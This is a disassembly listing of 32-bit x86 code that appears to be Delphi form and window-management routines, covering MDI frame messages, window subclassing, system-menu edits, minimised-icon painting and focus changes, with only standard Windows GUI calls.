mov [ esi + 0x10 ] 0x80000000
or [ esi + 0x4 ] 0xcf0000
jmp r-xdata
xor eax eax
mov al [ esp ]
cmp eax 0x5
ja r-xdata
mov al [ esp ]
test al al
je r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov al [ esp ]
add al 0xfc
sub al 0x2
jae r-xdata
jmp [ eax * 4 + jump_table_46351b ]
mov [ esp ] 0x2
sub al 0x3
jne r-xdata
mov al [ esp ]
sub al 0x3
jae r-xdata
mov [ esi + 0x8 ] 0x80
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44c5d8
mov al [ r-xdata ]
and al bl
mov ebx eax
cmp [ edi + 0x30 ] 0x0
jne r-xdata
or [ esi + 0x4 ] 0xc00000
jmp r-xdata
or [ esi + 0x4 ] 0xc40000
mov al [ edi + 0x230 ]
sub al 0x1
je r-xdata
mov eax [ esi + 0x4 ]
or eax 0x80000000
or eax 0xc00000
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x101
lea edx [ esi + 0x8 ]
mov eax edi
call sub_44c5d8
mov eax [ rw-data ]
cmp [ eax ] 0x0
jne r-xdata
mov [ edi + 0x22b ] 0x0
cmp [ edi + 0x22f ] 0x1
jne r-xdata
mov bl [ r-xdata ]
jmp r-xdata
cmp [ edi + 0x190 ] 0x0
jne r-xdata
mov [ esi + 0x14 ] 0x80000000
mov [ esi + 0x18 ] 0x80000000
jmp r-xdata
sub al 0x2
jne r-xdata
mov al [ r-xdata ]
and al bl
mov ebx eax
mov [ esi + 0x24 ] 0x2808
mov eax [ esi + 0x4 ]
or eax __dos_header
or eax 0x80
mov [ esi + 0x4 ] eax
test bl 0x8
je r-xdata
or [ esi + 0x4 ] 0x80000
test bl 0x2
je r-xdata
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x80000000
test [ edi + 0x1d ] 0x2
je r-xdata
or [ esi + 0x8 ] 0x400
test bl 0x4
je r-xdata
or [ esi + 0x4 ] 0x20000
mov al [ edi + 0x22b ]
cmp al 0x1
jne r-xdata
cmp [ edi + 0x22f ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff3fffff
or [ esi + 0x4 ] 0x10000
cmp al 0x2
jne r-xdata
or [ esi + 0x4 ] 0x20000000
jmp r-xdata
mov eax r-xdata
mov [ esi + 0x28 ] eax
test bl 0x1
je r-xdata
or [ esi + 0x4 ] 0x1000000
jmp r-xdata
sub_463685
add [ eax ] al
add [ ebx + 0x56 ] dl
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_460a30
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x229 ] 0x3
je r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov al [ ebx + 0x22f ]
sub al 0x2
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
mov eax ebx
call sub_463fdc
push eax
push 0x1
push 0x80
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
jmp r-xdata
mov [ esp + 0x4 ] 0xff00
xor eax eax
mov [ esp ] eax
mov esi [ ebx + 0x258 ]
test esi esi
je r-xdata
dec al
je r-xdata
push 0x56330001
push 0x0
push 0x0
mov eax ebx
call sub_4489b8
push eax
mov eax ebx
call sub_4489fc
push eax
mov eax ebx
call sub_44f7b4
push eax
push 0x0
mov eax [ rw-data ]
push eax
lea eax [ esp + 0x20 ]
push eax
mov edx r-xdata
xor ecx ecx
mov eax 0x200
call sub_406e8c
mov [ ebx + 0x254 ] eax
push ebx
push sub_4625c8
call sub_422214
mov [ ebx + 0x278 ] eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call GetWindowLongA
mov [ ebx + 0x274 ] eax
mov eax [ ebx + 0x278 ]
push eax
push 0xfffffffc
mov eax [ ebx + 0x254 ]
push eax
call SetWindowLongA
jmp r-xdata
mov eax esi
call sub_459348
mov [ esp ] eax
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
push 0xffffffff
mov eax ebx
call sub_44f7b4
push eax
call SetWindowPos
jmp r-xdata
sub_4637ca
add [ eax ] al
push ebp
mov ebp esp
add esp 0xffffff4c
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xb4 ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4638f5
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov esi edx
lea edi [ ebp - 0xb0 ]
mov ecx 0x23
[ edi ] [ esi ]
and [ ebp - 0xa8 ] 0xfff7ffff
lea edx [ ebp - 0xb0 ]
mov eax ebx
call sub_44c93c
and [ ebx + 0x2f4 ] 0xef
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
lea edx [ ebp - 0xb4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0xb4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
cmp [ eax + 0x254 ] 0x0
jne r-xdata
mov eax ebx
call sub_465ce8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4638fc
lea eax [ edx + 0x4c ]
mov [ ebp - 0x24 ] eax
mov eax [ edx ]
mov [ ebp - 0x20 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x1c ] eax
mov eax [ edx + 0xc ]
mov [ ebp - 0x18 ] eax
mov eax [ edx + 0x10 ]
mov [ ebp - 0x14 ] eax
mov eax [ edx + 0x14 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0x18 ]
mov [ ebp - 0xc ] eax
mov eax [ edx + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ edx + 0x20 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x24 ]
push eax
push 0x0
push 0x220
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
mov [ ebx + 0x180 ] eax
or [ ebx + 0x2f4 ] 0x10
jmp r-xdata
sub_463904
push ebx
mov ebx eax
test [ ebx + 0x2f4 ] 0x10
je r-xdata
mov eax ebx
call sub_44cba8
push 0x0
mov eax ebx
call sub_44f7b4
push eax
push 0x221
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x254 ]
push eax
call SendMessageA
jmp r-xdata
xor eax eax
mov [ ebx + 0x254 ] eax
pop ebx
retn
sub_463948
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x254 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44d32c
cmp [ esi ] 0x5
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebx + 0x254 ]
push eax
mov eax ebx
call sub_44f7b4
push eax
call DefFrameProcA
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_44f7b4
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop esi
pop ebx
retn
sub_4639ac
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor eax eax
push ebp
push sub_463a54
push [ fs : eax ]
mov [ fs : eax ] esp
cmp edi [ ebx + 0x220 ]
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463a5b
lea eax [ ebp - 0x4 ]
call sub_404164
retn
test edi edi
je r-xdata
mov [ ebx + 0x220 ] edi
test [ ebx + 0x1c ] 0x1
jne r-xdata
cmp ebx edi
je r-xdata
cmp [ ebx + 0x22e ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405fc8
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bb3c
call sub_403b1c
mov eax edi
call sub_45fd40
cmp ebx eax
jne r-xdata
mov eax ebx
mov si 0xffb2
call sub_403564
mov eax ebx
call sub_463d64
test [ ebx + 0x1c ] 0x1
jne r-xdata
mov eax edi
mov si 0xffb8
call sub_403564
test al al
jne r-xdata
sub_463a64
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test bl bl
je r-xdata
mov edx [ edi + 0x220 ]
mov eax esi
call sub_44c290
test al al
je r-xdata
mov edx [ edi + 0x224 ]
mov eax esi
call sub_44c290
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax edi
call sub_4639ac
mov eax [ esi + 0x30 ]
mov [ edi + 0x224 ] eax
sub_463aac
push ebx
push esi
mov esi eax
mov bl [ esi + 0x22e ]
mov eax esi
call sub_4639ac
test bl bl
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xc4 ]
sub_463ad0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov edi eax
xor ebx ebx
inc [ rw-data ]
cmp [ edi + 0x250 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x64 ] edx
mov eax [ rw-data ]
mov [ eax + 0x68 ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov edx edi
call sub_418a3c
mov eax [ rw-data ]
mov eax [ eax + 0x50 ]
mov ecx edi
xor edx edx
call sub_41891c
mov eax edi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
cmp edi [ ebp - 0x4 ]
je r-xdata
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x6c ] edx
mov eax [ rw-data ]
mov [ eax + 0x6c ] edi
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov edx edi
call sub_418a3c
mov eax [ rw-data ]
mov eax [ eax + 0x4c ]
mov ecx edi
xor edx edx
call sub_41891c
jmp r-xdata
xor eax eax
mov [ edi + 0x220 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x220 ] eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x54 ]
or ax [ r-xdata ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x54 ] ax
xor edx edx
push ebp
push sub_463d40
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov eax [ eax + 0x78 ]
cmp edi eax
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x20
jne r-xdata
cmp [ edi + 0x224 ] 0x0
jne r-xdata
test eax eax
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov [ edi + 0x224 ] edi
mov eax [ rw-data ]
mov [ eax + 0x78 ] edi
mov eax edi
call sub_44f7b4
mov dx 0xb000
call sub_45fb00
test al al
jne r-xdata
call sub_44f7b4
mov esi eax
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x78 ] edx
mov dx 0xb001
mov eax esi
call sub_45fb00
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_463d47
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
retn
jmp r-xdata
call sub_403bc8
jmp r-xdata
call sub_403bc8
jmp r-xdata
mov esi [ edi + 0x224 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_44c290
test al al
je r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ edi + 0x224 ]
call sub_44f7b4
mov esi eax
mov eax [ edi + 0x224 ]
mov eax [ eax + 0x30 ]
mov [ edi + 0x224 ] eax
mov dx 0xb01b
mov eax esi
call sub_45fb00
test al al
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
cmp eax [ edi + 0x224 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb007
mov eax edi
call sub_44a180
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
call sub_403bc8
jmp r-xdata
mov esi eax
mov [ edi + 0x224 ] esi
mov eax esi
call sub_44f7b4
mov dx 0xb01a
call sub_45fb00
test al al
jne r-xdata
cmp eax [ ebp - 0x4 ]
je r-xdata
mov esi [ esi + 0x30 ]
test esi esi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xcc ]
call sub_403bc8
jmp r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44a180
sub_463d64
push ebx
push esi
mov edx [ eax + 0x220 ]
test edx edx
je r-xdata
mov ebx eax
cmp [ eax + 0x250 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
push 0x0
xor ecx ecx
mov edx 0xb029
mov eax ebx
call sub_44a180
mov ebx edx
jmp r-xdata
mov eax ebx
call sub_44f7b4
push eax
call SetFocus
mov eax ebx
call sub_44f7b4
mov esi eax
call GetFocus
cmp esi eax
jne r-xdata
sub_463db4
push ebx
push esi
mov ebx edx
mov esi eax
mov [ esi + 0x22e ] bl
mov eax [ esi + 0x27c ]
test eax eax
je r-xdata
test bl bl
je r-xdata
push 0x0
xor ecx ecx
mov cl bl
mov edx 0xb02b
call sub_44a180
pop esi
pop ebx
retn
cmp [ esi + 0x220 ] 0x0
jne r-xdata
mov dl 0x1
mov eax esi
call sub_463e68
mov eax esi
call sub_463d64
test [ esi + 0x1c ] 0x10
jne r-xdata
push 0x1
push 0x0
mov cl 0x1
xor edx edx
mov eax esi
call sub_44fbdc
mov edx eax
mov eax esi
call sub_4639ac
sub_463e18
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x22e ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x2
jne r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_462a30
test eax eax
je r-xdata
push esi
xor ecx ecx
mov edx 0xb004
mov eax [ ebx + 0x220 ]
call sub_44a180
mov eax ebx
call sub_462a30
mov edx esi
call sub_463e18
sub_463e68
push esi
test [ eax + 0x2f4 ] 0x8
jne r-xdata
pop esi
retn
mov ecx [ rw-data ]
cmp [ ecx + 0x44 ] 0x0
je r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x248 ] 0x0
je r-xdata
mov ecx [ rw-data ]
cmp eax [ ecx + 0x44 ]
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
xor esi esi
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ rw-data ]
mov ecx [ ecx + 0x44 ]
cmp [ ecx + 0x22f ] 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x248 ]
test dl dl
je r-xdata
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx esi
call sub_45ce74
mov edx esi
call sub_45ce58
jmp r-xdata
mov ecx [ eax + 0x248 ]
cmp [ ecx + 0x5c ] 0x0
jne r-xdata
mov esi [ eax + 0x248 ]
cmp [ eax + 0x22f ] 0x1
jne r-xdata
sub_463f10
push ebx
push esi
push edi
push ebp
mov edi ecx
mov ebx edx
mov ebp eax
test ebx ebx
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
cmp edi ebx
je r-xdata
mov ebx esi
push 0x0
push 0x0
push ebp
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
sub_463f5c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb000
call sub_463f10
cmp [ ebx + 0x28a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_463f8c
push ebx
mov ebx eax
mov ecx ebx
mov edx [ ebx + 0x220 ]
mov eax 0xb001
call sub_463f10
cmp [ ebx + 0x2a2 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x2a4 ]
call [ ebx + 0x2a0 ]
sub_463ff8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_424df8
xor eax eax
push ebp
push sub_4640a6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
mov edx ebx
call sub_4251ec
xor eax eax
push ebp
push sub_464083
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffac
call sub_403564
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x250 ]
mov edx [ eax ]
call [ edx + 0x28 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46408a
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
xor edx edx
call sub_4251ec
retn
sub_4640b4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov [ esp + 0x4 ] dl
mov [ esp ] eax
xor ebx ebx
mov eax [ esp ]
call sub_462a30
mov [ esp + 0xc ] eax
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ esp ]
call sub_462a64
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
mov dl [ esp + 0x4 ]
mov eax [ esp + 0xc ]
mov si 0xffd1
call sub_403564
mov ebx eax
test [ esp + 0x4 ] bl
jne r-xdata
inc ebp
mov [ esp + 0x8 ] 0x0
mov eax ebx
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
mov dl [ esp + 0x4 ]
mov eax [ esp ]
call sub_44ea7c
mov ebx eax
mov edx [ esp + 0x8 ]
mov eax [ esp ]
call sub_462ab0
mov edi eax
cmp edi [ esp + 0xc ]
je r-xdata
inc [ esp + 0x8 ]
dec ebp
jne r-xdata
mov dl [ esp + 0x4 ]
mov eax edi
mov si 0xffd1
call sub_403564
or bl al
test [ esp + 0x4 ] bl
jne r-xdata
sub_464154
push ebx
push esi
add esp 0xffffffc0
mov esi edx
mov ebx eax
mov eax ebx
call sub_44f7b4
push eax
call IsIconic
test eax eax
jne r-xdata
push esp
mov eax ebx
call sub_44f7b4
push eax
call BeginPaint
mov esi eax
mov eax ebx
call sub_463fdc
push eax
push 0x0
push 0x0
push esi
call DrawIcon
push esp
mov eax ebx
call sub_44f7b4
push eax
call EndPaint
mov ax [ r-xdata ]
or ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
mov edx esi
mov eax ebx
call sub_44d944
mov ax [ r-xdata ]
not eax
and ax [ ebx + 0x54 ]
mov [ ebx + 0x54 ] ax
jmp r-xdata
add esp 0x40
pop esi
pop ebx
retn
sub_4641d2
add [ eax ] al
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
add esp 0x10
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov eax [ eax + 0x170 ]
call sub_4249d8
push eax
lea edx [ esp + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x4 ]
push eax
mov eax [ esi + 0x4 ]
push eax
call FillRect
jmp r-xdata
sub_464234
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_44f7b4
push eax
call IsIconic
test eax eax
jne r-xdata
mov [ edi ] 0x27
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop edi
pop esi
retn
mov edx edi
mov eax esi
call sub_44dc08
pop edi
pop esi
retn
sub_464280
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x0
je r-xdata
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_44f7b4
push eax
call GetSystemMenu
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x229 ] 0x3
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x2
jne r-xdata
push 0x0
push 0xf130
push ebx
call DeleteMenu
push 0x400
push 0x7
push ebx
call DeleteMenu
push 0x400
push 0x5
push ebx
call DeleteMenu
push 0x0
push 0xf030
push ebx
call DeleteMenu
push 0x0
push 0xf020
push ebx
call DeleteMenu
push 0x0
push 0xf000
push ebx
call DeleteMenu
push 0x0
push 0xf120
push ebx
call DeleteMenu
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
test [ eax + 0x228 ] 0x4
jne r-xdata
push 0x1
push 0xf020
push ebx
call EnableMenuItem
push 0x1
push 0xf030
push ebx
call EnableMenuItem
sub_46437c
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
call sub_462da4
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
pop ecx
pop ebp
retn
push ebp
call sub_464280
pop ecx
sub_4643b0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_44a69c
cmp [ ebx + 0x9b ] 0x1
jne r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_44f7b4
push eax
call IsIconic
test eax eax
jne r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_44f7b4
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_44f7b4
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov edx eax
xor dl 0x1
or ecx 0xffffffff
mov eax ebx
call sub_449674
pop esi
pop ebx
retn
sub_464440
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
cmp [ ebx + 0x248 ] 0x0
je r-xdata
push 0x0
push 0x1
push 0x80
mov eax ebx
call sub_44f7b4
push eax
call SendMessageA
mov edx esi
mov eax ebx
call sub_44ea08
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
je r-xdata
push 0x0
mov eax ebx
call sub_44f7b4
push eax
call SetMenu
xor edx edx
mov eax [ ebx + 0x248 ]
call sub_45c894
sub_4644a0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_44daa4
cmp [ ebx + 0x248 ] 0x0
je r-xdata
mov dx [ esi + 0x4 ]
mov eax [ ebx + 0x248 ]
call sub_45c2a8
test al al
jne r-xdata
pop esi
pop ebx
retn
sub_4644ec
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x248 ]
test eax eax
je r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx esi
call sub_45cb08
cmp [ esi + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
sub_464524
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi eax
xor eax eax
push ebp
push sub_4645bf
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ edi + 0x248 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4645c6
lea eax [ ebp - 0x4 ]
call sub_404164
retn
xor esi esi
cmp [ edx + 0x6 ] 0xffff
jne r-xdata
xor ebx ebx
movzx eax [ edx + 0x4 ]
test [ edx + 0x6 ] 0x10
je r-xdata
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov ecx ebx
mov edx eax
mov eax [ edi + 0x248 ]
call sub_45c208
mov esi eax
mov bl 0x1
push eax
mov eax [ edx + 0x8 ]
push eax
call GetSubMenu
test esi esi
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_469358
lea edx [ ebp - 0x4 ]
mov eax [ esi + 0x58 ]
call sub_4460f0
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_469358
jmp r-xdata
sub_4645ec
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp dl 0x1
je r-xdata
mov [ ebx + 0x22b ] dl
cmp [ ebx + 0x264 ] 0x0
je r-xdata
mov eax ebx
mov si 0xffd0
call sub_403564
pop esi
pop ebx
retn
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0x10 ]
sub_46462c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe4 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
call sub_40cfe0
test al al
jne r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov al 0x1
sub_464658
push ebx
push esi
mov ebx edx
xor edx edx
mov [ ebx + 0xc ] edx
test [ eax + 0x1c ] 0x10
jne r-xdata
mov esi [ ebx + 0x8 ]
xor edx edx
call sub_463e18
movzx ecx [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
mov eax 0xb017
call sub_445ec8
test eax eax
je r-xdata
cmp [ eax + 0x22f ] 0x1
je r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xc ] 0x1
cmp [ eax + 0x248 ] 0x0
je r-xdata
mov edx [ eax + 0x248 ]
cmp [ edx + 0x5c ] 0x0
je r-xdata
sub_4646b0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
jne r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf010
jne r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x44 ]
jne r-xdata
mov edx esi
mov eax ebx
call sub_44e8ec
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_467d0c
jmp r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp eax 0xf120
jne r-xdata
cmp [ ebx + 0x5b ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
and eax 0xfff0
cmp eax 0xf020
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x5b ] 0x0
je r-xdata
cmp [ ebx + 0x22b ] 0x1
jne r-xdata
mov eax ebx
mov si 0xffd0
call sub_403564
sub_46473c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ esi + 0x8 ]
dec eax
je r-xdata
mov eax ebx
call sub_44f7b4
push eax
call IsIconic
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax ebx
call sub_44f7b4
push eax
call IsZoomed
test eax eax
je r-xdata
mov [ ebx + 0x22c ] 0x2
jmp r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
jmp r-xdata
mov [ ebx + 0x22c ] 0x1
mov [ ebx + 0x22c ] 0x3
jmp r-xdata
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
pop ebx
retn
pop esi
pop ebx
retn
xor eax eax
mov al [ ebx + 0x22c ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax ebx
call sub_44f7b4
push eax
call ShowWindow
mov [ ebx + 0x22c ] 0x0
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4647d4
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x22f ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44f7b4
cmp eax [ ebx + 0x8 ]
sete al
mov ebx eax
mov edx ebx
mov eax esi
call sub_463db4
test bl bl
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
test [ eax + 0x54 ] 0x4
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x44 ]
mov dl 0x1
mov si 0xffd1
call sub_403564
sub_46482c
cmp [ edx + 0x8 ] 0x0
